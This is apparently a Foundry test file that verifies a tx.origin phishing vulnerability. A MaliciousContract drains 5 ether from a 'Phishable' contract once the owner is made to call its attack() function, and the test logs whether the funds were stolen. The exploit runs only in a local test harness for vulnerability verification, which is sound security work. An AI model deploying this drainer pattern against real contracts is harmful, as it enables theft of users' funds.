// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/phishable.sol";

contract PhishableTest is Test {
    Phishable phishable;
    address owner = address(0x1);
    address attacker = address(0x2);
    address victim = address(0x3);

    function setUp() public {
        vm.deal(victim, 10 ether);
        vm.startPrank(victim);
        phishable = new Phishable(owner);
        (bool success,) = address(phishable).call{value: 5 ether}("");
        require(success, "Transfer failed");
        vm.stopPrank();
    }

    function testTxOriginAttack() public {
        // Verify initial contract balance
        uint256 initialPhishableBalance = address(phishable).balance;
        assertEq(initialPhishableBalance, 5 ether);

        console.log("--- BEFORE-Trigger State ---");
        console.log("Phishable contract balance: %d ether", initialPhishableBalance);

        // Attacker creates malicious contract
        MaliciousContract malicious = new MaliciousContract(payable(address(phishable)));
        
        console.log("Malicious contract balance: %d ether", address(malicious).balance);
        console.log("----------------------------------------");

        console.log("--- Trigger Attack ---");
        // Simulate owner interacting with malicious contract
        // This makes tx.origin = owner while msg.sender = malicious contract
        vm.prank(owner, owner); // Sets both msg.sender and tx.origin
        malicious.attack();
        console.log("----------------------------------------");

        console.log("--- AFTER-Trigger State ---");
        uint256 postPhishableBalance = address(phishable).balance;
        uint256 postMaliciousBalance = address(malicious).balance;
        console.log("Phishable contract balance: %d ether", postPhishableBalance);
        console.log("Malicious contract balance: %d ether", postMaliciousBalance);

        // Differential verification
        bool fundsStolen = (postPhishableBalance == 0) && (postMaliciousBalance == 5 ether);
        
        console.log("----------------------------------------");
        console.log("Differential Verification Result:");
        console.log("Phishable balance change: %d -> %d", initialPhishableBalance, postPhishableBalance);
        console.log("Malicious contract received: %d ether", postMaliciousBalance);
        console.log("Funds stolen:", fundsStolen ? "YES" : "NO");
        console.log("----------------------------------------");

        // Final vulnerability verdict
        if (fundsStolen) {
            console.log("Vulnerability Exists: tx.origin vulnerability allows unauthorized fund transfers");
        } else {
            console.log("Vulnerability not Exist: tx.origin attack did not drain contract funds");
        }
    }
}

contract MaliciousContract {
    Phishable phishable;

    constructor(address payable _phishable) {
        phishable = Phishable(_phishable);
    }

    function attack() public {
        // This will pass tx.origin check since owner initiated the transaction
        phishable.withdrawAll(address(this));
    }

    receive() external payable {}
}